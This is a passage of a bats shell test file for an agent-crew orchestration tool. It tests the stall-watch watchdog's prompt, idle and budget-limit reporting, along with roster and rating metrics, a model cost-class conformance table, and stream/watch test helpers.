  stall_sampler "$p" "$p" "$p" "$p" "$p" GONE
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine claude \
    --grace 0 --interval 1 --window 1 --stall 1 --idle 1 --dead 999 --max-life 20
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: role mode clears prompt: to working under the role id" {
  p=$(fx_prompt_trust)
  q=$(fx_idle_box)
  stall_sampler "$p" "$p" "$q" GONE
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 20
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.from)|\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == role:feat/x:reviewer\|blocked\|prompt:* ]]
  [ "${lines[1]}" = "role:feat/x:reviewer|working|prompt: cleared" ]
}

@test "stall-watch: a role failed status on the bus exits the watch immediately" {
  seed_raw role:feat/x:reviewer failed "gate red" ""
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: role mode exits once the engine pane returns to a bare shell" {
  # The pane stays sampleable forever and --max-life is far off, so only the
  # bare-shell check can end the watch within a tick of the shell appearing.
  # The shell is keyed to the sample count, not wall time: the count left in
  # $SAMPLER_DIR/n says exactly which tick the watch stopped on.
  p=$(fx_idle_box)
  stall_sampler "$p"
  export CREW_STALL_PROC_CMD="[ \"\$(cat '$SAMPLER_DIR/n')\" -ge 3 ] && printf fish || printf claude"
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 30
  [ "$status" -eq 0 ]
  n="$(cat "$SAMPLER_DIR/n")"
  [ "$n" -ge 3 ]
  [ "$n" -le 4 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: role mode never calls tmux set-option for @crew_state" {
  stub_bin tmux
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run ! grep -q '@crew_state' "$STUB_LOG"
}

# ---------------------------------------------------------------------------
# stall-watch: D8 budget (engine budget cache → blocked/budget:)
# ---------------------------------------------------------------------------

# budget_now — the virtual clock's epoch, initialised so the fixture and the
# watcher agree on "now".
budget_now() {
  [ -s "$CREW_CLOCK" ] || date +%s >"$CREW_CLOCK"
  cat "$CREW_CLOCK"
}

# bwin <used_pct> <resets_at|null> — one window object of the cache.
bwin() { printf '{"used_pct":%s,"resets_at":%s}' "$1" "$2"; }

# budget_cache <fetched_offset_s> <engines-json> — write refresh-budget's cache,
# fetched <offset> seconds from the virtual now.
budget_cache() {
  local f
  f=$(($(budget_now) + $1))
  mkdir -p "$XDG_DATA_HOME/crew"
  jq -n --argjson e "$2" --argjson f "$f" \
    '{fetched_at:($f|todateiso8601), fetched_epoch:$f, engines:$e}' \
    >"$XDG_DATA_HOME/crew/engine-budget.json"
}

# budget_refresh_stub <fetched_offset_s> <engines-json> — a CREW_BUDGET_REFRESH_CMD
# that counts its calls and rewrites the cache as a refresh would.
budget_refresh_stub() {
  printf '%s' "$2" >"$BATS_TEST_TMPDIR/refresh-engines.json"
  cat >"$BATS_TEST_TMPDIR/refresh-stub" <<EOS
#!/usr/bin/env bash
echo call >>"$BATS_TEST_TMPDIR/refresh.calls"
f=\$((\$(cat "$CREW_CLOCK") + $1))
mkdir -p "$XDG_DATA_HOME/crew"
jq -n --slurpfile e "$BATS_TEST_TMPDIR/refresh-engines.json" --argjson f "\$f" \\
  '{fetched_at:(\$f|todateiso8601), fetched_epoch:\$f, engines:\$e[0]}' \\
  >"$XDG_DATA_HOME/crew/engine-budget.json"
EOS
  chmod +x "$BATS_TEST_TMPDIR/refresh-stub"
  export CREW_BUDGET_REFRESH_CMD="$BATS_TEST_TMPDIR/refresh-stub"
}

budget_calls() {
  if [ -f "$BATS_TEST_TMPDIR/refresh.calls" ]; then
    wc -l <"$BATS_TEST_TMPDIR/refresh.calls" | tr -d ' '
  else
    echo 0
  fi
}

# budget_watch <max-life> [stall-watch args...] — a lead watcher over a static
# idle pane; later args override these defaults.
budget_watch() {
  local life="$1"
  shift
  local p
  p=$(fx_idle_box)
  stall_sampler "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 \
    --budget-refresh 0 --max-life "$life" "$@"
}

# budget_rows — every status row as from|state|source|detail.
budget_rows() {
  bus | jq -r 'select(.kind=="status") | "\(.from)|\(.body.state)|\(.body.source)|\(.body.detail)"'
}

budget_reset_bus() {
  rm -f "$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
}

@test "stall-watch: D8 budget: lead claude window at 97% posts one blocked/budget: with the reset" {
  now=$(budget_now)
  resets=$((now + 15570))
  iso=$(jq -nr --argjson r "$resets" '$r | todateiso8601')
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 10 null),\"7d\":$(bwin 97 "$resets")}}}"
  budget_watch 6
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "worker:feat/x|blocked|watchdog|budget: claude 7d at 97% (resets $iso, in 4h 19m)" ]
}

@test "stall-watch: D8 budget: relative reset renders as Xd Yh, Xh Ym or Xm" {
  # <seconds-to-reset>|<expected rel>; each lands a little past the round value
  # so a tick of clock drift cannot change the rendering.
  for row in "183630|2d 3h" "100|1m"; do
    secs="${row%%|*}"
    want="${row#*|}"
    budget_reset_bus
    resets=$(($(budget_now) + secs))
    iso=$(jq -nr --argjson r "$resets" '$r | todateiso8601')
    budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$resets")}}}"
    budget_watch 3
    [ "$status" -eq 0 ]
    run budget_rows
    [ "${#lines[@]}" -eq 1 ]
    [ "${lines[0]}" = "worker:feat/x|blocked|watchdog|budget: claude 5h at 100% (resets $iso, in $want)" ]
  done
}

@test "stall-watch: D8 budget: a window with no reset time says so" {
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 96 null)}}}"
  budget_watch 3
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "worker:feat/x|blocked|watchdog|budget: claude 5h at 96% (no reset time)" ]
}

@test "stall-watch: D8 budget: codex spend-control limit posts blocked/budget: limit reached" {
  now=$(budget_now)
  budget_cache 0 "{\"codex\":{\"windows\":{\"5h\":$(bwin 40 "$((now + 9000))"),\"7d\":$(bwin 20 "$((now + 90000))")},\"limit_reached\":{\"spend_control_reached\":true},\"credits_cover\":false}}"
  budget_watch 6 --engine codex
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "worker:feat/x|blocked|watchdog|budget: codex limit reached: spend control reached" ]
}

@test "stall-watch: D8 budget: credits_cover appends the paid-credits suffix" {
  now=$(budget_now)
  budget_cache 0 "{\"codex\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 9000))")},\"limit_reached\":null,\"credits_cover\":true}}"
  budget_watch 3 --engine codex
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "worker:feat/x|blocked|watchdog|budget: codex 5h at 100% (resets "*" — credits cover: may be drawing paid credits" ]]
}

@test "stall-watch: D8 budget: clears to working when a refresh drops the engine below the line" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}}}"
  budget_refresh_stub 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 10 "$((now + 99999))")}}}"
  budget_watch 20 --budget-refresh 1 --dead 2
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == "worker:feat/x|blocked|watchdog|budget: claude 5h at 100% (resets "* ]]
  [ "${lines[1]}" = "worker:feat/x|working|watchdog|budget: cleared" ]
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: clears when the clock passes resets_at with no refresh" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 3))")}}}"
  budget_watch 10
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == "worker:feat/x|blocked|watchdog|budget: claude 5h at 100% (resets "* ]]
  [ "${lines[1]}" = "worker:feat/x|working|watchdog|budget: cleared" ]
}

@test "stall-watch: D8 budget: a window whose reset already passed posts nothing" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now - 60))")}}}"
  budget_watch 6
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: a stale cache posts nothing" {
  now=$(budget_now)
  budget_cache -10800 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}}}"
  budget_watch 6
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: an open episode is held, not cleared, when the cache turns stale" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}}}"
  budget_refresh_stub -10800 "{\"claude\":{\"windows\":{\"5h\":$(bwin 10 "$((now + 99999))")}}}"
  budget_watch 20 --budget-refresh 1
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "worker:feat/x|blocked|watchdog|budget: "* ]]
}

@test "stall-watch: D8 budget: a pr_open worker is not flagged" {
  seed_raw worker:feat/x pr_open "" ""
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}}}"
  budget_watch 6
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c watchdog || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: --no-budget posts nothing for an exhausted cache" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}}}"
  budget_watch 6 --no-budget
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: role mode judges its own engine and stays silent when that one has room" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}},\"codex\":{\"windows\":{\"5h\":$(bwin 50 "$((now + 99999))")},\"limit_reached\":null,\"credits_cover\":false}}"
  p=$(fx_idle_box)
  stall_sampler "$p"
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --budget-refresh 0 --max-life 6
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: role mode posts under the role id, never a worker row" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 10 "$((now + 99999))")}},\"codex\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")},\"limit_reached\":null,\"credits_cover\":false}}"
  p=$(fx_idle_box)
  stall_sampler "$p"
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --budget-refresh 0 --max-life 6
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "role:feat/x:reviewer|blocked|watchdog|budget: codex 5h at 100% (resets "* ]]
  run bash -c "bus | grep -c '\"from\":\"worker:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: refreshes a missing cache once and is then rate-limited by the stamp" {
  now=$(budget_now)
  budget_refresh_stub 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 10 "$((now + 99999))")}}}"
  budget_watch 10 --budget-refresh 900
  [ "$status" -eq 0 ]
  [ "$(budget_calls)" = "1" ]
  [ -f "$XDG_DATA_HOME/crew/engine-budget.json.refresh-at" ]
  budget_watch 10 --budget-refresh 900
  [ "$status" -eq 0 ]
  [ "$(budget_calls)" = "1" ]
}

@test "stall-watch: D8 budget: a fresh cache triggers no refresh" {
  now=$(budget_now)
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 10 "$((now + 99999))")}}}"
  budget_refresh_stub 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 10 "$((now + 99999))")}}}"
  budget_watch 10 --budget-refresh 900
  [ "$status" -eq 0 ]
  [ "$(budget_calls)" = "0" ]
}

# budget_count_stub — a CREW_BUDGET_REFRESH_CMD that only counts its calls and
# never writes the cache, so only the stamp or the lock can hold it back.
budget_count_stub() {
  printf '#!/usr/bin/env bash\necho call >>"%s"\n' "$BATS_TEST_TMPDIR/refresh.calls" \
    >"$BATS_TEST_TMPDIR/refresh-stub"
  chmod +x "$BATS_TEST_TMPDIR/refresh-stub"
  export CREW_BUDGET_REFRESH_CMD="$BATS_TEST_TMPDIR/refresh-stub"
}

@test "stall-watch: D8 budget: a refresh that never writes the cache is held back by the stamp" {
  budget_count_stub
  budget_watch 10 --budget-refresh 900
  [ "$status" -eq 0 ]
  budget_watch 10 --budget-refresh 900
  [ "$status" -eq 0 ]
  [ "$(budget_calls)" = "1" ]
}

@test "stall-watch: D8 budget: a live holder of the refresh lock means no refresh" {
  budget_count_stub
  mkdir -p "$XDG_DATA_HOME/crew/engine-budget.json.refresh.d"
  echo "$$" >"$XDG_DATA_HOME/crew/engine-budget.json.refresh.d/pid"
  budget_watch 10 --budget-refresh 900
  [ "$status" -eq 0 ]
  [ "$(budget_calls)" = "0" ]
}

@test "stall-watch: D8 budget: a pr_open posted during the refresh is not masked" {
  now=$(budget_now)
  budget_refresh_stub 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}}}"
  logf="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$logf")"
  cat >>"$BATS_TEST_TMPDIR/refresh-stub" <<EOS
jq -nc --argjson ts "\$((\$(cat "$CREW_CLOCK") * 1000))" \\
  '{ts:\$ts, crew_id:"c1", from:"worker:feat/x", to:"dispatcher:c1", kind:"status", body:{state:"pr_open"}}' \\
  >>"$logf"
EOS
  budget_watch 6 --budget-refresh 900
  [ "$status" -eq 0 ]
  [ "$(budget_calls)" = "1" ]
  run bash -c "bus | grep -c watchdog || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: an exponent-form resets_at still posts, without the relative part" {
  budget_cache 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 1e10)}}}"
  iso=$(jq -nr '1e10 | todateiso8601')
  budget_watch 3
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "worker:feat/x|blocked|watchdog|budget: claude 5h at 100% (resets $iso)" ]
}

@test "stall-watch: D8 budget: a zero-padded stamp is read as decimal" {
  now=$(budget_now)
  budget_refresh_stub 0 "{\"claude\":{\"windows\":{\"5h\":$(bwin 100 "$((now + 99999))")}}}"
  mkdir -p "$XDG_DATA_HOME/crew"
  echo 09 >"$XDG_DATA_HOME/crew/engine-budget.json.refresh-at"
  budget_watch 6 --budget-refresh 900
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "worker:feat/x|blocked|watchdog|budget: claude 5h at 100% (resets "* ]]
}

# A pi watcher on a local model has no account to exhaust: it reads the pane's
# @crew_model and looks it up in localModels.
budget_pi_local_fixture() { # <localModels-json>
  mkdir -p "$BATS_TEST_TMPDIR/pibin"
  cat >"$BATS_TEST_TMPDIR/pibin/tmux" <<'EOS'
#!/usr/bin/env bash
[ "$1" = show-options ] && printf 'local-x\n'
exit 0
EOS
  printf '%s' "{\"localModels\":$1}" >"$BATS_TEST_TMPDIR/pibin/models.json"
  printf '#!/usr/bin/env bash\ncat "%s"\n' "$BATS_TEST_TMPDIR/pibin/models.json" \
    >"$BATS_TEST_TMPDIR/pibin/dispatch-config"
  chmod +x "$BATS_TEST_TMPDIR/pibin/tmux" "$BATS_TEST_TMPDIR/pibin/dispatch-config"
  export PATH="$BATS_TEST_TMPDIR/pibin:$PATH"
  export DISPATCH_CONFIG_BIN="$BATS_TEST_TMPDIR/pibin/dispatch-config"
  budget_cache 0 "{\"pi\":{\"windows\":{},\"limit_reached\":{\"reason\":\"key credit limit exhausted\"},\"credits_cover\":false}}"
}

@test "stall-watch: D8 budget: a pi watcher on a local model is exempt" {
  budget_pi_local_fixture '{"local-x":{}}'
  budget_watch 6 --engine pi
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D8 budget: a pi watcher on a hosted model still posts the limit" {
  budget_pi_local_fixture '{}'
  budget_watch 6 --engine pi
  [ "$status" -eq 0 ]
  run budget_rows
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "worker:feat/x|blocked|watchdog|budget: pi limit reached: key credit limit exhausted" ]
}

@test "roster: carries source and truncates detail to 120 chars" {
  long=$(printf 'quiet: %0.sx' $(seq 1 200))
  seed_raw worker:feat/x blocked "$long" watchdog
  CREW_ID=c1 run run_crew roster c1
  [ "$status" -eq 0 ]
  run bash -c "printf '%s' '$output' | jq -r '.[0] | \"\(.source)|\(.detail|length)\"'"
  [ "$output" = "watchdog|120" ]
}

@test "roster: a worker-posted row has a null source" {
  CREW_ID=c1 run_crew status worker:feat/x blocked "which approach?"
  CREW_ID=c1 run run_crew roster c1
  run bash -c "printf '%s' '$output' | jq -r '.[0] | \"\(.source)|\(.detail)\"'"
  [ "$output" = "null|which approach?" ]
}

@test "rate: blocked_count excludes watchdog blocks, watchdog_blocked_count counts them" {
  logf="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$logf")"
  jq -nc '{ts:1,crew_id:"c1",kind:"dispatch",branch:"feat/x",engine:"claude",
           model:"opus",tier:"deep",effort:"high",title:"t"}' >>"$logf"
  seed_raw worker:feat/x blocked "which approach?" "" 2
  seed_raw worker:feat/x blocked "prompt: interactive prompt in pane %9 — waiting" watchdog 3
  seed_raw worker:feat/x blocked "quiet: pane unchanged for 1800s" watchdog 4
  # An account limit, not a stall: it must not count as a watchdog stall.
  seed_raw worker:feat/x blocked "budget: codex 5h at 100% (resets x)" watchdog 5
  store="$BATS_TEST_TMPDIR/xdg"
  XDG_DATA_HOME="$store" CREW_ID=c1 run run_crew rate
  [ "$status" -eq 0 ]
  run jq -r '"\(.blocked_count)|\(.watchdog_blocked_count)"' "$store/crew/ratings.jsonl"
  [ "$output" = "1|2" ]
}

# Contract pin, not a behaviour test: rate already passes any review_mode
# string through, so this passed before the value existed. It stops a later
# rate edit swallowing `unavailable` — it does not verify a worker emits it.
@test "rate: passes review_mode unavailable through untouched" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  cat >"$log" <<'EOF'
{"ts":1000,"crew_id":"c1","kind":"dispatch","branch":"feat/review-unavailable","engine":"codex","model":"terra","tier":"standard","effort":"medium","title":"review gate unavailable"}
{"ts":1001,"crew_id":"c1","kind":"status","from":"worker:feat/review-unavailable","body":{"state":"failed"}}
{"ts":1002,"crew_id":"c1","kind":"msg","from":"worker:feat/review-unavailable","to":"metrics:c1","body":"{\"review_mode\":\"unavailable\",\"review_high\":null}"}
EOF
  export XDG_DATA_HOME="$BATS_TEST_TMPDIR/data"

  run run_crew rate
  [ "$status" -eq 0 ]

  run jq -s -e '
    map(select(.branch=="feat/review-unavailable"))
    | .[0]
    | {review_mode, outcome, reached_pr} == {review_mode:"unavailable", outcome:"failed", reached_pr:false}
  ' "$XDG_DATA_HOME/crew/ratings.jsonl"
  [ "$status" -eq 0 ]
}

@test "burn map conformance: the doc slice names every classed rung" {
  # Copied from the Model map/Burn classes table, so it makes drift loud
  # rather than impossible — same tolerance as dispatch.bats's precedent
  # "tier map conformance" test. kimi-k3* is deliberately excluded: the burn
  # doc does not class it and _burn_weight falls it through to "" on purpose.
  # The cursor rungs listed are the non-fast defaults; `-fast` is a price
  # multiplier the sibling behavioural test below pins.
  doc="$BATS_TEST_DIRNAME/../adapters/core/protocols/dispatch-orchestration.md"
  doc_slice="$(sed -n '/^## Model map/,/^### Tier map/p' "$doc")"
  for token in opus sonnet haiku fable composer-2.5 \
    gpt-5.6-luna gpt-5.6-terra gpt-5.6-sol \
    grok-4.7-low grok-4.7-medium grok-4.7-high \
    claude-fable-5; do
    grep -qF "$token" <<<"$doc_slice" || {
      printf 'token %s missing from the Model map/Burn classes doc slice\n' "$token" >&2
      return 1
    }
  done
}

# _burn_weight is data now (#575): the table is defaults.json's `burnClasses`,
# resolved through dispatch-config, and the function matches each rule's shell
# glob in order. This test is the oracle — it crosses every classed model with
# every effort the dispatcher can pass and asserts the result the old case
# produced. It also exercises the glob families (`*grok-4.[0-9]-medium`) so
# 4.5, 4.6, and the prefix-less 4.7 ids price alike, which a token grep of the
# function body cannot see. Preload $_BURN_SETTINGS so the table resolves once,
# not per row.
@test "burn map conformance: defaults.json burnClasses prices every model x effort as the old case did" {
  weight() { # <model> [effort]
    bash -c 'source /dev/stdin <<<"$(sed -n "/^_burn_weight() {/,/^}/p" "$1")"; _burn_weight "$2" "$3"' _ "$CREW" "$1" "$2"
  }
  export _BURN_SETTINGS="$("$DISPATCH_CONFIG_BIN")"
  local model effort expected got

  # Opus is the one rung whose class follows effort; "-" is an absent effort.
  while read -r model effort expected; do
    [ -n "$model" ] || continue
    [ "$effort" = - ] && effort=""
    got="$(weight "$model" "$effort" | tr '\t' ' ')"
    [ "$got" = "$expected" ] || {
      printf '_burn_weight %s %s = "%s", expected "%s"\n' "$model" "$effort" "$got" "$expected" >&2
      return 1
    }
  done <<'EOF'
opus low standard 2
opus medium standard 2
opus high premium 4
opus xhigh premium 6
opus max premium 8
opus - premium 4
opus bogus premium 4
claude-opus-5 low standard 2
EOF

  # Every other classed model is effort-independent: cross it with each effort
  # and require the same class, so a stray effort key cannot leak in.
  while IFS=$'\t' read -r model expected; do
    [ -n "$model" ] || continue
    for effort in low medium high xhigh max ""; do
      got="$(weight "$model" "$effort" | tr '\t' ' ')"
      [ "$got" = "$expected" ] || {
        printf '_burn_weight %s %s = "%s", expected "%s"\n' "$model" "$effort" "$got" "$expected" >&2
        return 1
      }
    done
  done <<'EOF'
sonnet	standard 2
claude-sonnet-4-5	standard 2
haiku	cheap 1
claude-haiku-4-5	cheap 1
claude-fable-5	fable 8
fable	fable 8
gpt-5.6-sol	premium 4
gpt-5.6-terra	standard 2
gpt-5.6-luna	cheap 1
composer-2.5	free 0
composer-2.5-fast	free 0
cursor-grok-4.6-low	cheap 1
cursor-grok-4.6-medium	standard 2
cursor-grok-4.6-high	premium 4
cursor-grok-4.6-xhigh	premium 6
cursor-grok-4.5-low	cheap 1
cursor-grok-4.5-medium	standard 2
cursor-grok-4.5-high	premium 4
cursor-grok-4.6-low-fast	standard 2
cursor-grok-4.6-medium-fast	premium 4
cursor-grok-4.6-high-fast	premium 8
cursor-grok-4.6-xhigh-fast	premium 12
grok-4.7-low	cheap 1
grok-4.7-medium	standard 2
grok-4.7-high	premium 4
grok-4.7-xhigh	premium 6
grok-4.7-low-fast	standard 2
grok-4.7-medium-fast	premium 4
grok-4.7-high-fast	premium 8
grok-4.7-xhigh-fast	premium 12
EOF

  # kimi-k3-high and an unknown id stay unclassed rather than guessed.
  for model in kimi-k3-high some-unknown-model; do
    [ -z "$(weight "$model")" ] || {
      printf '_burn_weight %s = non-empty, expected unclassed\n' "$model" >&2
      return 1
    }
  done
}

# ---------------------------------------------------------------------------
# watch --crew / stream harness
# ---------------------------------------------------------------------------

# crew_dir [id] — the per-crew state dir `watch` and `stream` share.
crew_dir() {
  printf '%s' "$(git rev-parse --path-format=absolute --git-common-dir)/crew/crews/${1:-c1}"
}

# poll_for <tries> <cmd…> — run cmd every 0.1s until it succeeds, at most
# <tries> times. Every wait below is a bounded poll rather than a fixed sleep:
# a state change that already happened costs nothing, and one that never
# happens fails the test instead of hanging a --jobs 16 run.
poll_for() {
  local tries="$1" i=0
  shift
  while [ "$i" -lt "$tries" ]; do
    "$@" && return 0
    sleep 0.1
    i=$((i + 1))
  done
  return 1
}

# start_stream <args…> — launch `crew stream` as a REAL process. Never through
# run_crew: backgrounding a shell function makes $! the subshell's pid, so the
# --status pid comparison, the --force reclaim and every kill below would name
# the wrong process. </dev/null keeps it off bats' own pipes.
start_stream() {
  STREAM_N=$((${STREAM_N:-0} + 1))
  STREAM_OUT="$BATS_TEST_TMPDIR/stream.$STREAM_N.out"
  STREAM_ERR="$BATS_TEST_TMPDIR/stream.$STREAM_N.err"
  # Recorded so stop_stream polls the right crew's lock dir instead of always
  # c1's — a future test using --crew c2 would otherwise wait uselessly on c1
  # and then force-KILL a stream mid-shutdown.
  local args=("$@") i has_reap_every=""
  for ((i = 0; i < ${#args[@]}; i++)); do
    [ "${args[i]}" = --crew ] && STREAM_CREW_ID="${args[i + 1]}"
    [ "${args[i]}" = --reap-every ] && has_reap_every=1
  done
  # Defaults to no cadence reap: without this every pre-existing stream test's
  # batch would spawn a background `crew reap` against the host tmux server.
  [ -n "$has_reap_every" ] || args+=(--reap-every 0)
  bash -euo pipefail "${STREAM_CREW:-$CREW}" stream "${args[@]}" >"$STREAM_OUT" 2>"$STREAM_ERR" </dev/null &
  STREAM_PID=$!
  STREAM_PIDS="${STREAM_PIDS:-} $STREAM_PID"
}

# stop_stream — TERM every stream this test started, then reap it. The lock dir
# is the last thing the cleanup handler removes before its `exit 0`, so polling
# that bounds the wait; `kill -0` cannot, because a TERM'd child stays a
# not-yet-reaped zombie that still answers it.
stop_stream() {
  local spid
  [ -n "${STREAM_PIDS:-}" ] || return 0
  for spid in $STREAM_PIDS; do
    kill -TERM "$spid" 2>/dev/null || true
  done
  poll_for 60 test ! -d "$(crew_dir "${STREAM_CREW_ID:-c1}")/stream.lock.d" || {
    for spid in $STREAM_PIDS; do
      kill -KILL "$spid" 2>/dev/null || true
    done
  }
  for spid in $STREAM_PIDS; do
    wait "$spid" 2>/dev/null || true
  done
  STREAM_PIDS=""
  STREAM_PID=""
  STREAM_CREW_ID=""
}

# spawn_holder — set HOLDER_PID to a live pid that is NOT a child of this
# shell, for the lock `--force` has to reclaim. A child TERM'd by --force would
# sit unreaped, and `kill -0` on that zombie still succeeds, so --force's
# bounded wait could never see it clear. Called plainly and never through a
# command substitution: under bats the holder does not survive one.
spawn_holder() {
  local pf="$BATS_TEST_TMPDIR/holder.pid"
  (
    sleep 30 >/dev/null 2>&1 </dev/null &
    printf '%s' "$!" >"$pf"
  )
  HOLDER_PID="$(cat "$pf")"
}

# Predicates for poll_for.
stream_lines() { grep -c . "$STREAM_OUT" 2>/dev/null || true; }
at_least_lines() { [ "$(stream_lines)" -ge "$1" ]; }
lock_pid_is() { [ "$(cat "$(crew_dir)/stream.lock.d/pid" 2>/dev/null || true)" = "$1" ]; }
tick_ts() { jq -r '.ts // empty' "$(crew_dir)/stream.tick" 2>/dev/null || true; }
tick_after() {
  local t
  t="$(tick_ts)"
  [ -n "$t" ] && [ "$t" -gt "$1" ]
}
proc_gone() { ! kill -0 "$1" 2>/dev/null; }

# add_hold <resets_at> [title] — crew hold add for crew c1, every other
# required flag pinned to an arbitrary fixed value: only --resets-at and the
# title (to tell holds apart) vary per test. Prints the minted id.
add_hold() {
  run_crew hold add --crew c1 --engine claude --window 5h --resets-at "$1" \
    --agent claude --ref FOO-1 --branch feat/x --tier standard --model sonnet \
    --effort medium "${2:-hold}"
}

# Predicates and readers for the hold_due stream tests below.
hold_due_lines() { grep -c '"stream":"hold_due"' "$STREAM_OUT" 2>/dev/null || true; }
at_least_hold_due_lines() { [ "$(hold_due_lines)" -ge "$1" ]; }
heartbeat_seen() { grep -q '"stream":"heartbeat"' "$STREAM_OUT" 2>/dev/null; }
heartbeat_line() { grep '"stream":"heartbeat"' "$STREAM_OUT" | head -n1; }

@test "watch: --crew resolves that crew with CREW_ID unset and no WORKER_TASK.md" {
  CREW_ID=c1 run_crew status worker:feat/x done

  run --separate-stderr run_crew watch --crew c1 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].crew_id == "c1"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: an explicit --crew beats a WORKER_TASK.md at the repo top" {
  CREW_ID=c1 run_crew status worker:feat/x done
  printf 'crew_id: c9\n' >WORKER_TASK.md

  run --separate-stderr run_crew watch --crew c1 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
